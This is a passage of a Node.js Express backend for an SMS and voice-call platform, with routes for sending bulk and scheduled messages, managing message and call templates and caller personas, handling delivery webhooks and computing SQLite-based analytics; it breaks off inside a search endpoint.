        // Validate phone number format
        if (!to.match(/^\+[1-9]\d{1,14}$/)) {
            return res.status(400).json({
                success: false,
                error: 'Invalid phone number format. Use E.164 format (e.g., +1234567890)'
            });
        }

        const personaOverrides = {};
        if (business_id) personaOverrides.business_id = business_id;
        if (purpose) personaOverrides.purpose = purpose;
        if (emotion) personaOverrides.emotion = emotion;
        if (urgency) personaOverrides.urgency = urgency;
        if (technical_level) personaOverrides.technical_level = technical_level;
        if (channel) personaOverrides.channel = channel;

        const hasPersonaOverrides = Object.keys(personaOverrides).length > 0;

        const result = await smsService.sendSMS(
            to,
            message,
            from,
            hasPersonaOverrides ? personaOverrides : null
        );

        // Save to database
        if (db) {
            await db.saveSMSMessage({
                message_sid: result.message_sid,
                to_number: to,
                from_number: result.from,
                body: message,
                status: result.status,
                direction: 'outbound',
                template_name: templateName || null,
                template_variables: Object.keys(templateVariables || {}).length > 0 ? templateVariables : null,
                user_chat_id: user_chat_id
            });

            // Create webhook notification
            if (user_chat_id) {
                await db.createEnhancedWebhookNotification(
                    result.message_sid,
                    'sms_sent',
                    user_chat_id
                );
            }
        }

        res.json({
            success: true,
            ...result
        });
    } catch (error) {
        console.error('❌ SMS send error:', error);
        if (error.status) {
            return res.status(error.status).json({
                success: false,
                error: error.message,
                code: error.code,
                moreInfo: error.moreInfo
            });
        }
        res.status(500).json({
            success: false,
            error: 'Failed to send SMS',
            details: error.message
        });
    }
});

// Send bulk SMS endpoint
app.post('/api/sms/bulk', async (req, res) => {
    try {
        const { recipients, message, options = {}, user_chat_id } = req.body;

        if (!recipients || !Array.isArray(recipients) || recipients.length === 0) {
            return res.status(400).json({
                success: false,
                error: 'Recipients array is required and must not be empty'
            });
        }

        if (!message) {
            return res.status(400).json({
                success: false,
                error: 'Message is required'
            });
        }

        if (recipients.length > 100) {
            return res.status(400).json({
                success: false,
                error: 'Maximum 100 recipients per bulk send'
            });
        }

        const result = await smsService.sendBulkSMS(recipients, message, options);

        // Log bulk operation
        if (db) {
            await db.logBulkSMSOperation({
                total_recipients: result.total,
                successful: result.successful,
                failed: result.failed,
                message: message,
                user_chat_id: user_chat_id,
                timestamp: new Date()
            });
        }

        res.json({
            success: true,
            ...result
        });
    } catch (error) {
        console.error('❌ Bulk SMS error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to send bulk SMS',
            details: error.message
        });
    }
});

// Schedule SMS endpoint
app.post('/api/sms/schedule', async (req, res) => {
    try {
        const { to, message, scheduled_time, options = {} } = req.body;

        if (!to || !message || !scheduled_time) {
            return res.status(400).json({
                success: false,
                error: 'Phone number, message, and scheduled_time are required'
            });
        }

        const scheduledDate = new Date(scheduled_time);
        if (scheduledDate <= new Date()) {
            return res.status(400).json({
                success: false,
                error: 'Scheduled time must be in the future'
            });
        }

        const result = await smsService.scheduleSMS(to, message, scheduled_time, options);

        res.json({
            success: true,
            ...result
        });
    } catch (error) {
        console.error('❌ SMS schedule error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to schedule SMS',
            details: error.message
        });
    }
});

// SMS templates API
app.get('/api/sms/templates', async (req, res) => {
    try {
        const includeBuiltin = req.query.include_builtins !== 'false';
        const detailed = req.query.detailed === 'true';

        const { custom, builtin } = await smsService.listTemplates({
            includeContent: detailed,
            includeBuiltin
        });

        res.json({
            success: true,
            templates: custom,
            builtin
        });
    } catch (error) {
        console.error('❌ SMS templates error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to fetch templates',
            details: error.message
        });
    }
});

app.get('/api/sms/templates/:templateName', async (req, res) => {
    try {
        const { templateName } = req.params;
        const detailed = req.query.detailed !== 'false';

        const template = await smsService.fetchTemplateDefinition(templateName);
        if (!template) {
            return res.status(404).json({
                success: false,
                error: `Template '${templateName}' not found`
            });
        }

        if (!detailed) {
            delete template.content;
        }

        res.json({
            success: true,
            template
        });
    } catch (error) {
        console.error('❌ Error fetching template:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to fetch template',
            details: error.message
        });
    }
});

app.post('/api/sms/templates', async (req, res) => {
    try {
        const { name, description, content, metadata, created_by } = req.body;

        if (!name || !content) {
            return res.status(400).json({
                success: false,
                error: 'Template name and content are required'
            });
        }

        const existing = await smsService.fetchTemplateDefinition(name);
        if (existing) {
            return res.status(409).json({
                success: false,
                error: 'A template with that name already exists'
            });
        }

        if (!db) {
            return res.status(500).json({ success: false, error: 'Database not initialised' });
        }

        await db.createTemplate({
            name,
            description,
            content,
            metadata,
            created_by
        });

        const template = await smsService.fetchTemplateDefinition(name);

        res.status(201).json({
            success: true,
            template
        });
    } catch (error) {
        console.error('❌ Error creating template:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to create template',
            details: error.message
        });
    }
});

app.put('/api/sms/templates/:templateName', async (req, res) => {
    try {
        const { templateName } = req.params;
        const { description, content, metadata, updated_by } = req.body;

        if (!db) {
            return res.status(500).json({ success: false, error: 'Database not initialised' });
        }

        const existing = await smsService.fetchTemplateDefinition(templateName);
        if (!existing) {
            return res.status(404).json({ success: false, error: 'Template not found' });
        }
        if (existing.is_builtin) {
            return res.status(400).json({ success: false, error: 'Built-in templates cannot be edited' });
        }

        const updates = { updated_by };
        if (description !== undefined) updates.description = description;
        if (content !== undefined) updates.content = content;
        if (metadata !== undefined) updates.metadata = metadata;

        await db.updateTemplate(templateName, updates);

        const template = await smsService.fetchTemplateDefinition(templateName);

        res.json({ success: true, template });
    } catch (error) {
        console.error('❌ Error updating template:', error);
        res.status(500).json({ success: false, error: 'Failed to update template', details: error.message });
    }
});

app.delete('/api/sms/templates/:templateName', async (req, res) => {
    try {
        const { templateName } = req.params;

        if (!db) {
            return res.status(500).json({ success: false, error: 'Database not initialised' });
        }

        const existing = await smsService.fetchTemplateDefinition(templateName);
        if (!existing) {
            return res.status(404).json({ success: false, error: 'Template not found' });
        }
        if (existing.is_builtin) {
            return res.status(400).json({ success: false, error: 'Built-in templates cannot be deleted' });
        }

        await db.deleteTemplate(templateName);
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error deleting template:', error);
        res.status(500).json({ success: false, error: 'Failed to delete template', details: error.message });
    }
});

app.post('/api/sms/templates/:templateName/preview', async (req, res) => {
    try {
        const { templateName } = req.params;
        const { to, variables = {}, from, persona_overrides = {} } = req.body;

        if (!to) {
            return res.status(400).json({ success: false, error: 'Preview destination number is required' });
        }

        const rendered = await smsService.renderTemplate(templateName, variables);
        const result = await smsService.sendSMS(to, rendered.rendered, from, persona_overrides);

        res.json({
            success: true,
            preview: {
                to: result.to,
                message_sid: result.message_sid,
                content: rendered.rendered,
                template: rendered.name,
                variables: rendered.variables
            }
        });
    } catch (error) {
        console.error('❌ Error sending template preview:', error);
        if (error.status) {
            return res.status(error.status).json({
                success: false,
                error: error.message,
                code: error.code,
                moreInfo: error.moreInfo
            });
        }
        if (error.response) {
            return res.status(error.response.status || 400).json({
                success: false,
                error: error.message,
                details: error.response.data || error.response
            });
        }
        res.status(500).json({ success: false, error: 'Failed to send preview', details: error.message });
    }
});

// Get SMS messages from database for conversation view
app.get('/api/sms/messages/conversation/:phone', async (req, res) => {
    try {
        const { phone } = req.params;
        const limit = Math.min(parseInt(req.query.limit) || 50, 100);

        if (!phone) {
            return res.status(400).json({
                success: false,
                error: 'Phone number is required'
            });
        }

        const messages = await db.getSMSConversation(phone, limit);

        res.json({
            success: true,
            phone: phone,
            messages: messages,
            message_count: messages.length
        });

    } catch (error) {
        console.error('❌ Error fetching SMS conversation from database:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to fetch conversation',
            details: error.message
        });
    }
});

// Call template management endpoints
function normalizeTemplatePayload(body) {
    const {
        name,
        description,
        business_id,
        prompt,
        first_message,
        voice_model,
        persona_config
    } = body;

    const cleanVoiceModel = typeof voice_model === 'string' && voice_model.trim().length > 0
        ? voice_model.trim()
        : null;

    let parsedPersona = null;
    if (persona_config) {
        if (typeof persona_config === 'string') {
            try {
                parsedPersona = JSON.parse(persona_config);
            } catch (error) {
                throw new Error('persona_config must be valid JSON');
            }
        } else if (typeof persona_config === 'object') {
            parsedPersona = persona_config;
        }
    }

    let canonicalBusinessId = null;
    if (business_id) {
        const profile = getBusinessProfile(business_id);
        canonicalBusinessId = profile ? profile.id : business_id;
    }

    return {
        name,
        description,
        business_id: canonicalBusinessId,
        prompt,
        first_message,
        voice_model: cleanVoiceModel,
        persona_config: parsedPersona
    };
}

function isTemplateNameConstraint(error) {
    if (!error) {
        return false;
    }
    const message = error.message || '';
    return error.code === 'SQLITE_CONSTRAINT' || /UNIQUE constraint failed: call_templates\.name/i.test(message);
}

async function suggestTemplateName(baseName = 'template') {
    const sanitized = (baseName || 'template').trim() || 'template';
    const suffixMatch = sanitized.match(/-(\d+)$/);
    const prefix = suffixMatch ? sanitized.slice(0, -suffixMatch[0].length) : sanitized;
    let counter = suffixMatch ? parseInt(suffixMatch[1], 10) + 1 : 1;
    let attempts = 0;
    const maxAttempts = 50;

    while (attempts < maxAttempts) {
        const candidate = `${prefix}-${counter}`;
        // eslint-disable-next-line no-await-in-loop
        const existing = await db.getCallTemplateByName(candidate);
        if (!existing) {
            return candidate;
        }
        counter += 1;
        attempts += 1;
    }

    return `${prefix}-${Date.now()}`;
}

app.get('/api/call-templates', async (req, res) => {
    try {
        const templates = await db.getCallTemplates();
        res.json({ success: true, templates });
    } catch (error) {
        console.error('❌ Failed to list call templates:', error);
        res.status(500).json({ success: false, error: 'Failed to list call templates' });
    }
});

app.get('/api/call-templates/:id', async (req, res) => {
    try {
        const id = Number(req.params.id);
        if (Number.isNaN(id)) {
            return res.status(400).json({ success: false, error: 'Invalid template ID' });
        }

        const template = await db.getCallTemplateById(id);
        if (!template) {
            return res.status(404).json({ success: false, error: 'Template not found' });
        }

        res.json({ success: true, template });
    } catch (error) {
        console.error('❌ Failed to fetch call template:', error);
        res.status(500).json({ success: false, error: 'Failed to fetch call template' });
    }
});

app.post('/api/call-templates', async (req, res) => {
    let payload;
    try {
        payload = normalizeTemplatePayload(req.body);

        if (!payload.name || payload.name.trim().length === 0) {
            return res.status(400).json({ success: false, error: 'Template name is required' });
        }

        await db.createCallTemplate(payload);
        const template = await db.getCallTemplateByName(payload.name);

        res.status(201).json({ success: true, template });
    } catch (error) {
        if (isTemplateNameConstraint(error)) {
            const suggestion = await suggestTemplateName(payload?.name || 'template');
            return res.status(409).json({
                success: false,
                error: 'Template name already exists',
                code: 'TEMPLATE_NAME_DUPLICATE',
                suggested_name: suggestion
            });
        }
        console.error('❌ Failed to create call template:', error);
        res.status(500).json({ success: false, error: 'Failed to create call template', details: error.message });
    }
});

app.put('/api/call-templates/:id', async (req, res) => {
    let payload;
    try {
        const id = Number(req.params.id);
        if (Number.isNaN(id)) {
            return res.status(400).json({ success: false, error: 'Invalid template ID' });
        }

        const existing = await db.getCallTemplateById(id);
        if (!existing) {
            return res.status(404).json({ success: false, error: 'Template not found' });
        }

        payload = normalizeTemplatePayload(req.body);
        await db.updateCallTemplate(id, payload);
        const updated = await db.getCallTemplateById(id);

        res.json({ success: true, template: updated });
    } catch (error) {
        if (isTemplateNameConstraint(error)) {
            const suggestion = await suggestTemplateName(payload?.name || 'template');
            return res.status(409).json({
                success: false,
                error: 'Template name already exists',
                code: 'TEMPLATE_NAME_DUPLICATE',
                suggested_name: suggestion
            });
        }
        console.error('❌ Failed to update call template:', error);
        res.status(500).json({ success: false, error: 'Failed to update call template', details: error.message });
    }
});

app.post('/api/call-templates/:id/clone', async (req, res) => {
    let cloneName;
    try {
        const id = Number(req.params.id);
        if (Number.isNaN(id)) {
            return res.status(400).json({ success: false, error: 'Invalid template ID' });
        }

        const template = await db.getCallTemplateById(id);
        if (!template) {
            return res.status(404).json({ success: false, error: 'Template not found' });
        }

        const { name, description } = req.body;
        cloneName = name;

        if (!name || name.trim().length === 0) {
            return res.status(400).json({ success: false, error: 'Clone name is required' });
        }

        await db.createCallTemplate({
            name,
            description: description || template.description,
            business_id: template.business_id,
            prompt: template.prompt,
            first_message: template.first_message,
            persona_config: template.persona_config,
            voice_model: template.voice_model
        });

        const cloned = await db.getCallTemplateByName(name);
        res.status(201).json({ success: true, template: cloned });
    } catch (error) {
        if (isTemplateNameConstraint(error)) {
            const suggestion = await suggestTemplateName(cloneName || 'template');
            return res.status(409).json({
                success: false,
                error: 'Template name already exists',
                code: 'TEMPLATE_NAME_DUPLICATE',
                suggested_name: suggestion
            });
        }
        console.error('❌ Failed to clone call template:', error);
        res.status(500).json({ success: false, error: 'Failed to clone call template', details: error.message });
    }
});

app.delete('/api/call-templates/:id', async (req, res) => {
    try {
        const id = Number(req.params.id);
        if (Number.isNaN(id)) {
            return res.status(400).json({ success: false, error: 'Invalid template ID' });
        }

        const existing = await db.getCallTemplateById(id);
        if (!existing) {
            return res.status(404).json({ success: false, error: 'Template not found' });
        }

        await db.deleteCallTemplate(id);
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Failed to delete call template:', error);
        res.status(500).json({ success: false, error: 'Failed to delete call template', details: error.message });
    }
});

const PERSONA_SLUG_PATTERN = /^[a-z0-9_-]{3,64}$/;

function isBuiltinPersona(slug) {
    return DEFAULT_PERSONAS.some((persona) => persona.id === slug);
}

function sanitizePurposes(input) {
    if (!input) {
        return [];
    }

    if (!Array.isArray(input)) {
        throw new Error('purposes must be an array');
    }

    return input
        .map((item) => {
            if (!item || typeof item !== 'object') {
                return null;
            }
            const id = typeof item.id === 'string' ? item.id.trim().toLowerCase() : null;
            const label = typeof item.label === 'string' ? item.label.trim() : null;
            if (!id || !label) {
                return null;
            }
            return {
                id,
                label,
                emoji: typeof item.emoji === 'string' ? item.emoji : undefined,
                defaultEmotion: item.defaultEmotion || item.default_emotion || null,
                defaultUrgency: item.defaultUrgency || item.default_urgency || null,
                defaultTechnicalLevel: item.defaultTechnicalLevel || item.default_technical_level || null
            };
        })
        .filter(Boolean);
}

function sanitizeMetadata(input) {
    if (!input) {
        return null;
    }
    if (typeof input !== 'object') {
        throw new Error('metadata must be an object');
    }
    return input;
}

app.get('/api/personas', async (req, res) => {
    try {
        const custom = await db.listPersonaProfiles();
        res.json({
            success: true,
            builtin: DEFAULT_PERSONAS,
            custom,
            counts: {
                builtin: DEFAULT_PERSONAS.length,
                custom: custom.length,
                total: DEFAULT_PERSONAS.length + custom.length
            }
        });
    } catch (error) {
        console.error('❌ Failed to list personas:', error);
        res.status(500).json({ success: false, error: 'Failed to list personas', details: error.message });
    }
});

app.get('/api/personas/:slug', async (req, res) => {
    try {
        const slug = req.params.slug.trim().toLowerCase();
        const builtin = DEFAULT_PERSONAS.find((persona) => persona.id === slug);
        if (builtin) {
            return res.json({ success: true, persona: builtin, source: 'builtin' });
        }

        const profile = await db.getPersonaProfileBySlug(slug);
        if (!profile) {
            return res.status(404).json({ success: false, error: 'Persona not found' });
        }

        res.json({ success: true, persona: profile, source: 'custom' });
    } catch (error) {
        console.error('❌ Failed to fetch persona:', error);
        res.status(500).json({ success: false, error: 'Failed to fetch persona', details: error.message });
    }
});

app.post('/api/personas', async (req, res) => {
    try {
        const {
            slug,
            label,
            description = null,
            purposes,
            default_purpose,
            default_emotion,
            default_urgency,
            default_technical_level,
            call_template_id,
            sms_template_name,
            metadata,
            created_by,
            updated_by
        } = req.body || {};

        if (typeof slug !== 'string' || !PERSONA_SLUG_PATTERN.test(slug)) {
            return res.status(400).json({ success: false, error: 'slug must be 3-64 characters (lowercase, digits, hyphen, underscore)' });
        }

        if (isBuiltinPersona(slug)) {
            return res.status(409).json({ success: false, error: 'Cannot override built-in persona' });
        }

        const existing = await db.getPersonaProfileBySlug(slug);
        if (existing) {
            return res.status(409).json({ success: false, error: 'Persona with this slug already exists' });
        }

        if (typeof label !== 'string' || !label.trim()) {
            return res.status(400).json({ success: false, error: 'label is required' });
        }

        const sanitizedPurposes = sanitizePurposes(purposes);
        const sanitizedMetadata = sanitizeMetadata(metadata);

        await db.createPersonaProfile({
            slug,
            label: label.trim(),
            description: typeof description === 'string' ? description.trim() : null,
            purposes: sanitizedPurposes,
            default_purpose: default_purpose || null,
            default_emotion: default_emotion || null,
            default_urgency: default_urgency || null,
            default_technical_level: default_technical_level || null,
            call_template_id: Number.isInteger(call_template_id) ? call_template_id : null,
            sms_template_name: typeof sms_template_name === 'string' ? sms_template_name.trim() || null : null,
            metadata: sanitizedMetadata,
            created_by: created_by || 'api',
            updated_by: updated_by || created_by || 'api'
        });

        const persona = await db.getPersonaProfileBySlug(slug);
        res.status(201).json({ success: true, persona });
    } catch (error) {
        if (error instanceof Error && error.message && error.message.includes('must be')) {
            return res.status(400).json({ success: false, error: error.message });
        }
        console.error('❌ Failed to create persona:', error);
        res.status(500).json({ success: false, error: 'Failed to create persona', details: error.message });
    }
});

app.put('/api/personas/:slug', async (req, res) => {
    try {
        const slug = req.params.slug.trim().toLowerCase();
        if (isBuiltinPersona(slug)) {
            return res.status(403).json({ success: false, error: 'Built-in personas cannot be modified' });
        }

        const existing = await db.getPersonaProfileBySlug(slug);
        if (!existing) {
            return res.status(404).json({ success: false, error: 'Persona not found' });
        }

        const updates = {};
        const {
            label,
            description,
            purposes,
            default_purpose,
            default_emotion,
            default_urgency,
            default_technical_level,
            call_template_id,
            sms_template_name,
            metadata,
            updated_by
        } = req.body || {};

        if (label !== undefined) {
            if (typeof label !== 'string' || !label.trim()) {
                return res.status(400).json({ success: false, error: 'label must be a non-empty string' });
            }
            updates.label = label.trim();
        }

        if (description !== undefined) {
            if (description !== null && typeof description !== 'string') {
                return res.status(400).json({ success: false, error: 'description must be a string or null' });
            }
            updates.description = typeof description === 'string' ? description.trim() : null;
        }

        if (purposes !== undefined) {
            try {
                updates.purposes = sanitizePurposes(purposes);
            } catch (validationError) {
                return res.status(400).json({ success: false, error: validationError.message });
            }
        }

        if (default_purpose !== undefined) updates.default_purpose = default_purpose || null;
        if (default_emotion !== undefined) updates.default_emotion = default_emotion || null;
        if (default_urgency !== undefined) updates.default_urgency = default_urgency || null;
        if (default_technical_level !== undefined) updates.default_technical_level = default_technical_level || null;

        if (call_template_id !== undefined) {
            if (call_template_id === null || Number.isInteger(call_template_id)) {
                updates.call_template_id = call_template_id;
            } else {
                return res.status(400).json({ success: false, error: 'call_template_id must be an integer or null' });
            }
        }

        if (sms_template_name !== undefined) {
            if (sms_template_name === null || typeof sms_template_name === 'string') {
                updates.sms_template_name = sms_template_name ? sms_template_name.trim() : null;
            } else {
                return res.status(400).json({ success: false, error: 'sms_template_name must be a string or null' });
            }
        }

        if (metadata !== undefined) {
            try {
                updates.metadata = sanitizeMetadata(metadata);
            } catch (validationError) {
                return res.status(400).json({ success: false, error: validationError.message });
            }
        }

        if (updated_by !== undefined) {
            updates.updated_by = updated_by;
        }

        if (Object.keys(updates).length === 0) {
            return res.status(400).json({ success: false, error: 'No updates provided' });
        }

        await db.updatePersonaProfile(slug, updates);
        const persona = await db.getPersonaProfileBySlug(slug);
        res.json({ success: true, persona });
    } catch (error) {
        console.error('❌ Failed to update persona:', error);
        res.status(500).json({ success: false, error: 'Failed to update persona', details: error.message });
    }
});

app.delete('/api/personas/:slug', async (req, res) => {
    try {
        const slug = req.params.slug.trim().toLowerCase();
        if (isBuiltinPersona(slug)) {
            return res.status(403).json({ success: false, error: 'Built-in personas cannot be deleted' });
        }

        const existing = await db.getPersonaProfileBySlug(slug);
        if (!existing) {
            return res.status(404).json({ success: false, error: 'Persona not found' });
        }

        await db.deletePersonaProfile(slug);
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Failed to delete persona:', error);
        res.status(500).json({ success: false, error: 'Failed to delete persona', details: error.message });
    }
});

// Get recent SMS messages from database
app.get('/api/sms/messages/recent', async (req, res) => {
    try {
        const limit = Math.min(parseInt(req.query.limit) || 10, 50);
        const offset = parseInt(req.query.offset) || 0;

        const messages = await db.getSMSMessages(limit, offset);

        res.json({
            success: true,
            messages: messages,
            count: messages.length,
            limit: limit,
            offset: offset
        });

    } catch (error) {
        console.error('❌ Error fetching recent SMS messages:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to fetch recent messages',
            details: error.message
        });
    }
});

// Get SMS database statistics
app.get('/api/sms/database-stats', async (req, res) => {
    try {
        const hours = parseInt(req.query.hours) || 24;
        const dateFrom = new Date(Date.now() - (hours * 60 * 60 * 1000)).toISOString();

        // Get comprehensive SMS statistics from database
        const stats = await new Promise((resolve, reject) => {
            const queries = {
                // Total messages
                totalMessages: `SELECT COUNT(*) as count FROM sms_messages`,
                
                // Messages by direction
                messagesByDirection: `
                    SELECT direction, COUNT(*) as count 
                    FROM sms_messages 
                    GROUP BY direction
                `,
                
                // Messages by status
                messagesByStatus: `
                    SELECT status, COUNT(*) as count 
                    FROM sms_messages 
                    GROUP BY status
                    ORDER BY count DESC
                `,
                
                // Recent messages
                recentMessages: `
                    SELECT * FROM sms_messages 
                    WHERE created_at >= ?
                    ORDER BY created_at DESC 
                    LIMIT 5
                `,
                
                // Bulk operations
                bulkOperations: `SELECT COUNT(*) as count FROM bulk_sms_operations`,
                
                // Recent bulk operations
                recentBulkOps: `
                    SELECT * FROM bulk_sms_operations 
                    WHERE created_at >= ?
                    ORDER BY created_at DESC 
                    LIMIT 3
                `
            };

            const results = {};
            let completed = 0;
            const total = Object.keys(queries).length;

            for (const [key, query] of Object.entries(queries)) {
                const params = ['recentMessages', 'recentBulkOps'].includes(key) ? [dateFrom] : [];
                
                db.db.all(query, params, (err, rows) => {
                    if (err) {
                        console.error(`SMS stats query error for ${key}:`, err);
                        results[key] = key.includes('recent') ? [] : [{ count: 0 }];
                    } else {
                        results[key] = rows || [];
                    }
                    
                    completed++;
                    if (completed === total) {
                        resolve(results);
                    }
                });
            }
        });

        // Process the statistics
        const processedStats = {
            total_messages: stats.totalMessages[0]?.count || 0,
            sent_messages: stats.messagesByDirection.find(d => d.direction === 'outbound')?.count || 0,
            received_messages: stats.messagesByDirection.find(d => d.direction === 'inbound')?.count || 0,
            delivered_count: stats.messagesByStatus.find(s => s.status === 'delivered')?.count || 0,
            failed_count: stats.messagesByStatus.find(s => s.status === 'failed')?.count || 0,
            pending_count: stats.messagesByStatus.find(s => s.status === 'pending')?.count || 0,
            bulk_operations: stats.bulkOperations[0]?.count || 0,
            recent_messages: stats.recentMessages || [],
            recent_bulk_operations: stats.recentBulkOps || [],
            status_breakdown: stats.messagesByStatus || [],
            direction_breakdown: stats.messagesByDirection || [],
            time_period_hours: hours
        };

        // Calculate success rate
        const totalSent = processedStats.sent_messages;
        const delivered = processedStats.delivered_count;
        processedStats.success_rate = totalSent > 0 ? 
            Math.round((delivered / totalSent) * 100) : 0;

        res.json({
            success: true,
            ...processedStats
        });

    } catch (error) {
        console.error('❌ Error fetching SMS database statistics:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to fetch database statistics',
            details: error.message
        });
    }
});

// Get SMS status by message SID
app.get('/api/sms/status/:messageSid', async (req, res) => {
    try {
        const { messageSid } = req.params;

        const message = await new Promise((resolve, reject) => {
            db.db.get(
                `SELECT * FROM sms_messages WHERE message_sid = ?`,
                [messageSid],
                (err, row) => {
                    if (err) {
                        reject(err);
                    } else {
                        resolve(row);
                    }
                }
            );
        });

        if (!message) {
            return res.status(404).json({
                success: false,
                error: 'Message not found'
            });
        }

        res.json({
            success: true,
            message: message
        });

    } catch (error) {
        console.error('❌ Error fetching SMS status:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to fetch message status',
            details: error.message
        });
    }
});

// SMS webhook delivery status notifications (enhanced)
app.post('/webhook/sms-delivery', async (req, res) => {
    try {
        const { MessageSid, MessageStatus, ErrorCode, ErrorMessage, To, From } = req.body;

        console.log(`📱 SMS Delivery Status: ${MessageSid} -> ${MessageStatus}`);

        // Update message status in database
        if (db) {
            await db.updateSMSStatus(MessageSid, {
                status: MessageStatus,
                error_code: ErrorCode,
                error_message: ErrorMessage
            });

            // Get the original message to find user_chat_id for notification
            const message = await new Promise((resolve, reject) => {
                db.db.get(
                    `SELECT * FROM sms_messages WHERE message_sid = ?`,
                    [MessageSid],
                    (err, row) => {
                        if (err) reject(err);
                        else resolve(row);
                    }
                );
            });

            // Create webhook notification if user_chat_id exists
            if (message && message.user_chat_id) {
                const notificationType = MessageStatus === 'delivered' ? 'sms_delivered' :
                                       MessageStatus === 'failed' ? 'sms_failed' :
                                       `sms_${MessageStatus}`;

                await db.createEnhancedWebhookNotification(
                    MessageSid,
                    notificationType,
                    message.user_chat_id,
                    MessageStatus === 'failed' ? 'high' : 'normal'
                );

                console.log(`📨 Created ${notificationType} notification for user ${message.user_chat_id}`);
            }
        }

        res.status(200).send('OK');
    } catch (error) {
        console.error('❌ SMS delivery webhook error:', error);
        res.status(200).send('OK'); // Always return 200 to prevent retries
    }
});

// Get SMS statistics
app.get('/api/sms/stats', async (req, res) => {
  try {
    const stats = smsService.getStatistics();
    const activeConversations = smsService.getActiveConversations();
    
    res.json({
      success: true,
      statistics: stats,
      active_conversations: activeConversations.slice(0, 20), // Last 20 conversations
      sms_service_enabled: true
    });
    
  } catch (error) {
    console.error('❌ SMS stats error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to get SMS statistics'
    });
  }
});

// Bulk SMS status endpoint
app.get('/api/sms/bulk/status', async (req, res) => {
    try {
        const limit = Math.min(parseInt(req.query.limit) || 10, 50);
        const hours = parseInt(req.query.hours) || 24;
        const dateFrom = new Date(Date.now() - (hours * 60 * 60 * 1000)).toISOString();

        const bulkOperations = await new Promise((resolve, reject) => {
            db.db.all(`
                SELECT * FROM bulk_sms_operations 
                WHERE created_at >= ?
                ORDER BY created_at DESC 
                LIMIT ?
            `, [dateFrom, limit], (err, rows) => {
                if (err) {
                    reject(err);
                } else {
                    resolve(rows || []);
                }
            });
        });

        // Get summary statistics
        const summary = bulkOperations.reduce((acc, op) => {
            acc.totalOperations += 1;
            acc.totalRecipients += op.total_recipients;
            acc.totalSuccessful += op.successful;
            acc.totalFailed += op.failed;
            return acc;
        }, {
            totalOperations: 0,
            totalRecipients: 0,
            totalSuccessful: 0,
            totalFailed: 0
        });

        summary.successRate = summary.totalRecipients > 0 ? 
            Math.round((summary.totalSuccessful / summary.totalRecipients) * 100) : 0;

        res.json({
            success: true,
            summary: summary,
            operations: bulkOperations,
            time_period_hours: hours
        });

    } catch (error) {
        console.error('❌ Error fetching bulk SMS status:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to fetch bulk SMS status',
            details: error.message
        });
    }
});

// SMS analytics dashboard endpoint
app.get('/api/sms/analytics', async (req, res) => {
    try {
        const days = parseInt(req.query.days) || 7;
        const dateFrom = new Date(Date.now() - (days * 24 * 60 * 60 * 1000)).toISOString();

        const analytics = await new Promise((resolve, reject) => {
            const queries = {
                // Daily message volume
                dailyVolume: `
                    SELECT 
                        DATE(created_at) as date,
                        COUNT(*) as total,
                        COUNT(CASE WHEN direction = 'outbound' THEN 1 END) as sent,
                        COUNT(CASE WHEN direction = 'inbound' THEN 1 END) as received,
                        COUNT(CASE WHEN status = 'delivered' THEN 1 END) as delivered,
                        COUNT(CASE WHEN status = 'failed' THEN 1 END) as failed
                    FROM sms_messages 
                    WHERE created_at >= ?
                    GROUP BY DATE(created_at) 
                    ORDER BY date DESC
                `,
                
                // Hourly distribution
                hourlyDistribution: `
                    SELECT 
                        strftime('%H', created_at) as hour,
                        COUNT(*) as count
                    FROM sms_messages 
                    WHERE created_at >= ?
                    GROUP BY strftime('%H', created_at)
                    ORDER BY hour
                `,
                
                // Top phone numbers (anonymized)
                topNumbers: `
                    SELECT 
                        SUBSTR(COALESCE(to_number, from_number), 1, 6) || 'XXXX' as phone_prefix,
                        COUNT(*) as message_count
                    FROM sms_messages 
                    WHERE created_at >= ?
                    GROUP BY SUBSTR(COALESCE(to_number, from_number), 1, 6)
                    ORDER BY message_count DESC 
                    LIMIT 10
                `,
                
                // Error analysis
                errorAnalysis: `
                    SELECT 
                        error_code,
                        error_message,
                        COUNT(*) as count
                    FROM sms_messages 
                    WHERE created_at >= ? AND error_code IS NOT NULL
                    GROUP BY error_code, error_message
                    ORDER BY count DESC
                    LIMIT 10
                `
            };

            const results = {};
            let completed = 0;
            const total = Object.keys(queries).length;

            for (const [key, query] of Object.entries(queries)) {
                db.db.all(query, [dateFrom], (err, rows) => {
                    if (err) {
                        console.error(`SMS analytics query error for ${key}:`, err);
                        results[key] = [];
                    } else {
                        results[key] = rows || [];
                    }
                    
                    completed++;
                    if (completed === total) {
                        resolve(results);
                    }
                });
            }
        });

        // Calculate summary metrics
        const summary = {
            total_messages: 0,
            total_sent: 0,
            total_received: 0,
            total_delivered: 0,
            total_failed: 0,
            delivery_rate: 0,
            error_rate: 0
        };

        analytics.dailyVolume.forEach(day => {
            summary.total_messages += day.total;
            summary.total_sent += day.sent;
            summary.total_received += day.received;
            summary.total_delivered += day.delivered;
            summary.total_failed += day.failed;
        });

        if (summary.total_sent > 0) {
            summary.delivery_rate = Math.round((summary.total_delivered / summary.total_sent) * 100);
            summary.error_rate = Math.round((summary.total_failed / summary.total_sent) * 100);
        }

        res.json({
            success: true,
            period: {
                days: days,
                from: dateFrom,
                to: new Date().toISOString()
            },
            summary: summary,
            daily_volume: analytics.dailyVolume,
            hourly_distribution: analytics.hourlyDistribution,
            top_numbers: analytics.topNumbers,
            error_analysis: analytics.errorAnalysis,
            enhanced_analytics: true
        });

    } catch (error) {
        console.error('❌ Error fetching SMS analytics:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to fetch SMS analytics',
            details: error.message
        });
    }
});

// SMS search endpoint
app.get('/api/sms/search', async (req, res) => {
    try {
        const query = req.query.q;
        const limit = Math.min(parseInt(req.query.limit) || 20, 50);
        const direction = req.query.direction; // 'inbound', 'outbound', or null for all
        const status = req.query.status; // message status filter

